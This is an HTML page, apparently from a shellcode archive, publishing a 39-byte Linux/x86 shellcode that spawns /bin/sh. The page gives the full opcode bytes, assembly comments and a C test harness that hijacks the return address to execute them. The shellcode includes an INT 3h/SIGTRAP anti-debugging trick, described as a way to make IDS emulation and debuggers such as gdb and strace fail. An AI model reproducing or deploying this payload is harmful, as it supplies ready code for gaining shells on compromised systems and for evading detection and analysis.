<html><head><title>Linux/x86 - anti-debug trick (INT 3h trap) + execve(/bin/sh, [/bin/sh, NULL], NULL) - 39 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) anti-debug trick (INT 3h trap) + execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], NULL) - 39 bytes 
 * 
 * The idea behind a shellcode w/ an anti-debugging trick embedded in it, is if for any reason the IDS 
 * would try to x86-emulate the shellcode it would *glitch* and fail. This also protectes the shellcode 
 * from running within a debugger environment such as gdb and strace. 
 *
 * How this works? the shellcode registers for the SIGTRAP signal (aka. Breakpoint Interrupt) and use it 
 * to call the acutal payload (e.g. _evil_code) while a greedy debugger or a confused x86-emu won't pass 
 * the signal handler to the shellcode, it would end up doing _exit() instead execuve() 
 *
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x6a\x30&quot;              // push $0x30 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x6a\x05&quot;              // push $0x5 
	&quot;\x5b&quot;                  // pop %ebx 
	&quot;\xeb\x05&quot;              // jmp &lt;_evil_code&gt; 

	//
 	// &lt;_evilcode_loc&gt;:
	//

	&quot;\x59&quot;                  // pop %ecx 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\xcc&quot;                  // int3 
	&quot;\x40&quot;                  // inc %eax 
	&quot;\xe8\xf6\xff\xff\xff&quot;  // call &lt;_evilcode_loc&gt; 
	&quot;\x99&quot;                  // cltd 

	// 
        // &lt;_evil_code&gt;: 
        //

	&quot;\xb0\x0b&quot;              // mov $0xb,%al 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x68\x2f\x2f\x73\x68&quot;  // push $0x68732f2f 
	&quot;\x68\x2f\x62\x69\x6e&quot;  // push $0x6e69622f 
	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x53&quot;                  // push %ebx 
	&quot;\x54&quot;                  // push %esp 
	&quot;\xeb\xe1&quot;;             // jmp &lt;_evilcode_loc&gt; 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
